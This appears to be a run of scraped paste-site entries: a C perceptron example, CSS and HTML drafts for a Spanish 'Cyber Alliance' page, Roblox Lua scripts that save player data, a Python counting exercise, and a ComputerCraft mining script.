    double output = p->activation(aggregation);
    return output;
}

// trains a perceptron with a dataset of inputs and the expected outpus for them
void perceptron_train(perceptron *p, double **inputs, double *expected_outputs, size_t data_count) {
    double y;
    double error;
    size_t row = 0;

    while(row < data_count) {
        y = perceptron_predict(p, inputs[row]);
        error = expected_outputs[row] - y;
        if(error == 0) {
            // if there is no error take the next group of inputs
            ++row;
        } else {
            // if the error is set then recalculate the weights and go to da capo
            p->bias += p->learning_rate * error;
            for(int i = 0; i < p->inputs_count; ++i) {
                p->weight[i] += p->learning_rate * error * inputs[row][i];
            }
            row = 0;
        }
    }
}

// print the internal state of a perceptron
void perceptron_print(perceptron *p) {
    printf(""perceptron %p\n"", p);
    printf("" + learning rate: %lf\n"", p->learning_rate);
    printf("" + bias: %lf\n"", p->bias);
    for(size_t i = 0; i < p->inputs_count; ++i) {
        printf("" + wheight[%u]: %lf\n"", i, p->weight[i]);
    }
}

// frees the 'weight' dynamic array
void perceptron_dispose(perceptron *n) {
    free(n->weight);
}

int main() {
    // dataset for an 'and' gate
    double *inputs[] = {
        (double[]){ 0, 0 },
        (double[]){ 0, 1 },
        (double[]){ 1, 0 },
        (double[]){ 1, 1 }
    };
    double outputs[] = { 0, 0, 0, 1 };

    // creating the perceptron
    perceptron p;
    perceptron_init(&p, 2, 0.1, step_function);
    if(p.inputs_count == 0)
        return EXIT_FAILURE;

    // training the perceptron
    perceptron_train(&p, inputs, outputs, 4);
    perceptron_print(&p);

    // demostration
    for(int k=0; k<4; ++k) {
        double x[] = {(k>>1) & 1, k & 1};
        double s = perceptron_predict(&p, x);

        printf(""%1.0lf y %1.0lf = %1.0lf\n"", x[0], x[1], s);
    }

    // liberation of resources
    perceptron_dispose(&p);
}"
znqa3Xxw,cyber alliance css draft 18,Anonx0,CSS,Thursday 28th of December 2023 12:46:31 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {}

summary {
  background: var(--blood);
  border: .2rem solid var(--crimson);
  color: var(--light);
  cursor: pointer;
  list-style: none;
  padding: 1rem;
}

details[open] summary {
  background: var(--crimson);
}

.detailsBox {
  border-bottom: .2rem solid var(--crimson);
  border-left: .2rem solid var(--crimson);
  border-right: .2rem solid var(--crimson);
  padding: 1rem;
}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  footer {}
}"
BxfP3iar,cyber alliance css draft 17,Anonx0,CSS,Thursday 28th of December 2023 12:33:33 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {}

summary {
  background: var(--blood);
  border: .2rem solid var(--crimson);
  color: var(--light);
  cursor: pointer;
  padding: 1rem;
}

details[open] summary {
  background: var(--crimson);
}

.detailsBox {
  border-bottom: .2rem solid var(--crimson);
  border-left: .2rem solid var(--crimson);
  border-right: .2rem solid var(--crimson);
  padding: 1rem;
}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  footer {}
}"
djmz9jH8,cyber alliance draft 10,Anonx0,HTML 5,Thursday 28th of December 2023 12:25:40 PM CDT,"<!doctype html>
<html lang=""es"">
  <head>
    <meta charset=""utf-8"">
    <link href=""main.css"" rel=""stylesheet"">
    <title></title>
  </head>
  <body>
    <header>
      <h1>
        <abbr lang=""en"" title=""HyperText Markup Language"">HTML</abbr>
      </h1>
      <p>Estándar bifurcado por <span lang=""en"">Cyber Alliance</span>. Última revisión: <time datetime=""1704067200"">1 de enero de 2024</time>.</p>
    </header>
    <hr>
    <main>
      <section data-ref=""alpha-0"">
        <h2>Sumario</h2>
        <details>
          <summary>Capítulos</summary>
          <div class=""detailsBox""></div>
        </details>
      </section>
    </main>
    <footer></footer>
  </body>
</html>"
xrxXfhhU,cyber alliance css draft 16,Anonx0,CSS,Thursday 28th of December 2023 12:23:33 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {}

summary {
  background: var(--blood);
  border: .2rem solid var(--crimson);
  color: var(--light);
  cursor: pointer;
  list-style-type: '> ';
  padding: 1rem;
}

details[open] summary {
  list-style-type: 'v ';
}

.detailsBox {
  border-bottom: .2rem solid var(--crimson);
  border-left: .2rem solid var(--crimson);
  border-right: .2rem solid var(--crimson);
  padding: 1rem;
}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  footer {}
}"
w7dCrXE9,New Story Game DataStore (Main),Sungmingamerpro13,CSS,Thursday 28th of December 2023 12:00:10 PM CDT,"local TeleportService = game:GetService(""TeleportService"")
local AddRoundsDataStore = game:GetService(""DataStoreService""):GetDataStore(""AddRounds"")
local AddWinsDataStore = game:GetService(""DataStoreService""):GetDataStore(""AddWins"")
local CoinsDataStore = game:GetService(""DataStoreService""):GetDataStore(""Coins"")
local LevelsDataStore = game:GetService(""DataStoreService""):GetDataStore(""Level"")
local ExpDataStore = game:GetService(""DataStoreService""):GetDataStore(""Exp"")

local VIPGamepass = (267214996)

game.Players.PlayerAdded:Connect(function(player)

	local Folder = Instance.new(""Folder"", player)
	Folder.Name = ""leaderstats""

	local AddRounds = Instance.new(""NumberValue"", player)
	AddRounds.Name = ""AddRounds""
	AddRounds.Value = AddRoundsDataStore:GetAsync(player.UserId) or 0

	local AddWins = Instance.new(""NumberValue"", player)
	AddWins.Name = ""AddWins""
	AddWins.Value = AddWinsDataStore:GetAsync(player.UserId) or 0

	local Coins = Instance.new(""NumberValue"", player)
	Coins.Name = ""Coins""
	Coins.Value = CoinsDataStore:GetAsync(player.UserId) or 0

	local Levels = Instance.new(""NumberValue"", Folder)
	Levels.Name = ""Levels""
	Levels.Value = LevelsDataStore:GetAsync(player.UserId) or 1

	local Exp = Instance.new(""NumberValue"", Folder)
	Exp.Name = ""Exp""
	Exp.Value = ExpDataStore:GetAsync(player.UserId) or 0

	while wait() do
		if Exp.Value >= (100 * (Levels.Value + 1)) then
			Levels.Value = Levels.Value + 1
			Exp.Value = 0
		end
	end

	if game:GetService(""MarketplaceService""):UserOwnsGamePassAsync(player.UserId, VIPGamepass) then
		player.Coins.Value = player.Coins.Value * 2
	end

end)

game.Players.PlayerRemoving:Connect(function(player)
	AddRoundsDataStore:SetAsync(player.UserId, player.AddRounds.Value)
	AddWinsDataStore:SetAsync(player.UserId, player.AddWins.Value)
	CoinsDataStore:SetAsync(player.UserId, player.Coins.Value)
	LevelsDataStore:SetAsync(player.UserId, player.leaderstats.Levels.Value)
	ExpDataStore:SetAsync(player.UserId, player.leaderstats.Exp.Value)
end)

game:BindToClose(function()
	print(""STOPPED!"")

	for i,player in pairs(game.Players:GetPlayers()) do
		AddRoundsDataStore:SetAsync(player.UserId, player.AddRounds.Value)
		AddWinsDataStore:SetAsync(player.UserId, player.AddWins.Value)
		CoinsDataStore:SetAsync(player.UserId, player.Coins.Value)
		LevelsDataStore:SetAsync(player.UserId, player.leaderstats.Levels.Value)
		ExpDataStore:SetAsync(player.UserId, player.leaderstats.Exp.Value)
		print(""Saved data for ""..player.Name)
	end
end)

"
SYdkHtcr,New Story Game DataStore + Money Update (Main),Sungmingamerpro13,CSS,Thursday 28th of December 2023 11:58:16 AM CDT,"local TeleportService = game:GetService(""TeleportService"")
local AddRoundsDataStore = game:GetService(""DataStoreService""):GetDataStore(""AddRounds"")
local AddWinsDataStore = game:GetService(""DataStoreService""):GetDataStore(""AddWins"")
local CoinsDataStore = game:GetService(""DataStoreService""):GetDataStore(""Coins"")
local LevelsDataStore = game:GetService(""DataStoreService""):GetDataStore(""Level"")
local ExpDataStore = game:GetService(""DataStoreService""):GetDataStore(""Exp"")
local MoneyDataStore = game:GetService(""DataStoreService""):GetDataStore(""Money"")

local VIPGamepass = (267214996)

game.Players.PlayerAdded:Connect(function(player)

	local Folder = Instance.new(""Folder"", player)
	Folder.Name = ""leaderstats""

	local AddRounds = Instance.new(""NumberValue"", player)
	AddRounds.Name = ""AddRounds""
	AddRounds.Value = AddRoundsDataStore:GetAsync(player.UserId) or 0

	local AddWins = Instance.new(""NumberValue"", player)
	AddWins.Name = ""AddWins""
	AddWins.Value = AddWinsDataStore:GetAsync(player.UserId) or 0

	local Coins = Instance.new(""NumberValue"", player)
	Coins.Name = ""Coins""
	Coins.Value = CoinsDataStore:GetAsync(player.UserId) or 0

	local Levels = Instance.new(""NumberValue"", Folder)
	Levels.Name = ""Levels""
	Levels.Value = LevelsDataStore:GetAsync(player.UserId) or 1

	local Exp = Instance.new(""NumberValue"", Folder)
	Exp.Name = ""Exp""
	Exp.Value = ExpDataStore:GetAsync(player.UserId) or 0
	
	local Money = Instance.new(""NumberValue"", player)
	Money.Name = ""Money""
	Money.Value = MoneyDataStore:GetAsync(player.UserId) or 0

	while wait() do
		if Exp.Value >= (100 * (Levels.Value + 1)) then
			Levels.Value = Levels.Value + 1
			Exp.Value = 0
		end
	end

	if game:GetService(""MarketplaceService""):UserOwnsGamePassAsync(player.UserId, VIPGamepass) then
		player.Coins.Value = player.Coins.Value * 2
	end

end)

game.Players.PlayerRemoving:Connect(function(player)
	AddRoundsDataStore:SetAsync(player.UserId, player.AddRounds.Value)
	AddWinsDataStore:SetAsync(player.UserId, player.AddWins.Value)
	CoinsDataStore:SetAsync(player.UserId, player.Coins.Value)
	LevelsDataStore:SetAsync(player.UserId, player.leaderstats.Levels.Value)
	ExpDataStore:SetAsync(player.UserId, player.leaderstats.Exp.Value)
	MoneyDataStore:SetAsync(player.UserId, player.Money.Value)
end)

game:BindToClose(function()
	print(""STOPPED!"")

	for i,player in pairs(game.Players:GetPlayers()) do
		AddRoundsDataStore:SetAsync(player.UserId, player.AddRounds.Value)
		AddWinsDataStore:SetAsync(player.UserId, player.AddWins.Value)
		CoinsDataStore:SetAsync(player.UserId, player.Coins.Value)
		LevelsDataStore:SetAsync(player.UserId, player.leaderstats.Levels.Value)
		ExpDataStore:SetAsync(player.UserId, player.leaderstats.Exp.Value)
		MoneyDataStore:SetAsync(player.UserId, player.Money.Value)
		print(""Saved data for ""..player.Name)
	end
end)

"
6nWy7fhT,5 из статграда,DaniDori,Python,Thursday 28th of December 2023 11:56:58 AM CDT,"arr = [0]*10000
for i in range(1, 100):
    s = bin(i)[2:]
    s += bin(i % 4)[2:]
    n = int(s, 2)
    arr[n] = 1
maxi = 0
# for i in range(10000):
#     maxi = max(maxi, arr[i:i+49].count(1))
maxi = max(arr[i:i+49].count(1) for i in range(10000))
print(maxi)"
Jg1m4JEW,rednet mine,dataclear,Lua,Thursday 28th of December 2023 11:45:46 AM CDT,"peripheral.find(""modem"", rednet.open)

-- constants
pusherSide = ""left""
pullerSide = ""right""
mineSide = ""back""
mineSeconds = 5
 
rs.setOutput(pusherSide, false)
rs.setOutput(pullerSide, false)
rs.setOutput(mineSide, false)


function pulseRS(side)

    rs.setOutput(side, true)
    sleep(1)
    rs.setOutput(side, false)

end


function runMining()

    rs.setOutput(mineSide, true)
    sleep(mineSeconds)
    rs.setOutput(mineSide, true)

end


function getMineStatus()

    print(""running getMineStatus..."")
 
    local id, message = rednet.receive()
    
    print(""got message: "" .. message)
    
    return message == ""MINE""
    

end


function mineStrip()

    runMining()
    pulseRS(pullerSide)
    sleep(0.5)
    pulseRS(pusherSide)

end

while true
do

    if getMineStatus() == true then
        print(""Mining one strip"")
        mineStrip()
    end
    sleep(2)

 end"
